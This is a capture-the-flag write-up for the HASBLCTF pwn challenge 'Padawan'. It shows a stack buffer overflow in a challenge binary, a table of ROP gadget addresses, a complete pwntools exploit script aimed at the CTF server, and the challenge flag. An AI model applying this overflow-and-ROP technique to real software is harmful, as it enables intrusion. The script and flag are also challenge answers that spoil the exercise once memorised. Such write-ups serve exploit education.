# HASBLCTF Writeup: Padawan

**CTF Name:** HASBLCTF  
**Category:** PWN  
**Challenge/Task Name:** Padawan  
**Difficulty:** Medium  
**Author:** Phantom Blaze  
**Target:** `nc 34.77.68.154 10005`

## Objective
Exploit the binary to call the hidden `strike` function with three specific arguments and retrieve the flag.

## Solution / Walkthrough

### 1. Analyzing the Binary
The binary is a 64-bit ELF with the following security profile:
- **No PIE** (fixed addresses)
- **No Stack Canary** (no buffer overflow detection)
- **NX enabled** (no shellcode on stack)

The `main` function allocates a 32-byte buffer (`0x20` bytes) but reads up to **128 bytes** (`0x80`) from stdin — a classic buffer overflow:

```c
int64_t buf;
__builtin_memset(&buf, 0, 0x20);
// ...
read(0, &buf, 0x80);  // Buffer Overflow!
```

### 2. Identifying the Win Condition
The binary contains a hidden function named `strike` at `0x401186`. This function reads and prints `flag.txt`, but only if called with three specific arguments:

```c
if (arg1 != 0xdeadcafe) { puts("You couldn't attack!"); exit(1); }
if (arg2 != 0xcafebabe) { puts("You couldn't dodge!"); exit(1); }
if (arg3 == 0xdeadc0de) {
    read(fd, buf, 0x100);
    puts(buf);
}
```

### 3. Building the ROP Chain
Since this is x86_64, arguments are passed via registers (`rdi`, `rsi`, `rdx`). We located the following ROP gadgets in the binary:

| Gadget | Address |
|--------|---------|
| `pop rdi; ret` | `0x4013bf` |
| `pop rsi; ret` | `0x4013d7` |
| `pop rdx; ret` | `0x4013de` |
| `ret` (alignment) | `0x40101a` |

### 4. The Exploit

```python
from pwn import *

elf = ELF('./main')
r = remote('34.77.68.154', 10005)

padding = b'A' * 40  # 32-byte buffer + 8-byte saved RBP

payload  = padding
payload += p64(0x4013bf) + p64(0xdeadcafe)   # pop rdi; ret → arg1
payload += p64(0x4013d7) + p64(0xcafebabe)   # pop rsi; ret → arg2
payload += p64(0x4013de) + p64(0xdeadc0de)   # pop rdx; ret → arg3
payload += p64(0x40101a)                       # ret (stack alignment)
payload += p64(0x401186)                       # strike()

r.recvuntil(b'...')
r.send(payload)
print(r.recvall().decode())
```

### 5. Retrieving the Flag
The exploit overwrites the return address with a ROP chain that sets up all three arguments and calls `strike()`, which reads and prints the flag.

**Flag:**  
`HASBL{M4Y_7H3_F0RC3_B3_W17H_Y0U}`
